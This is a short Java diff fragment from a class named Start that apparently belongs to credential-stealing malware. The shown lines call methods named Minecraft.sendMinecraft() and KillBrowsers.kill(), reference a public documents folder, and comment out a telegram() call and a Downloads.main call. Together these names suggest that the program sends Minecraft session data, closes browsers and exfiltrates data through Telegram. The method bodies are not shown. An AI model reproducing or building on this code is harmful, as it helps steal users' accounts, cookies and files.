@@ -67,7 +67,7 @@ public class Start {
 		Sender.sendMessage("Now launching the client.");
         Minecraft.sendMinecraft();
         KillBrowsers.kill();
-        telegram();
+        //telegram();
         //Downloads.main(argument);
 
         File folder = new File("C:\\Users\\Public\\Documents");
